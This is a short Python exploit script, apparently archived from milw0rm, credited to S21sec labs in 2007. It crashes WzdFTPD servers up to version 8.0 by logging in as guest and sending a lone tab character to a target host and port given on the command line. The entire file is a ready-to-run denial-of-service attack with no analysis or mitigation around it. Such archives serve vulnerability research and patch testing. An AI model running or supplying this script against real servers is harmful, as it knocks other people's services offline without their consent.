#!/usr/bin/env python
#
# WzdFTPD Denial of Service (<= 8.0)
#
# wzdftpd_dos.py by Jose Miguel Esparza
# 2007-01-19 S21sec labs

import sys,socket

user = "guest"
passw = "guest"
if len(sys.argv) != 3: 
	sys.exit("Usage: " + sys.argv[0] + " target_host target_port\n")
target = sys.argv[1]
targetPort = int(sys.argv[2])

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target,targetPort))
s.recv(1024)
s.sendall("USER " + user + "\r\n")
s.recv(1024)
s.sendall("PASS " + passw + "\r\n")
s.recv(1024)
s.sendall("\t")
s.close()

# milw0rm.com [2009-07-24]
